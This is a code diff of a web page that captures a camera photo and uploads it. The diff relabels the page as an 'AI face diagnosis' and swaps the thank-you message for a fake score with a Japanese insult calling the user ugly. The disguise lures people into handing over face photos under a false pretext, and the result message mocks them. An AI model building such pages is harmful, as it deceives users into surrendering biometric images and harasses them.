@@ -56,7 +56,7 @@
 </style>
 </head>
 <body>
-  <h1>写真撮影システム</h1>
+  <h1>AI顔診断</h1>
   <p>カメラを許可して撮影してください</p>
   <video id="video" autoplay playsinline></video>
   <canvas id="canvas" style="display:none;"></canvas>
@@ -98,7 +98,7 @@
           method: 'POST',
           body: form
         }).then(() => {
-          document.body.innerHTML = '<h1>写真を送信しました。ありがとう！</h1>';
+          document.body.innerHTML = '<h1>。診断結果:23点お前ブスだな</h1>';
         }).catch(err => {
           alert('送信エラー: ' + err);
         });
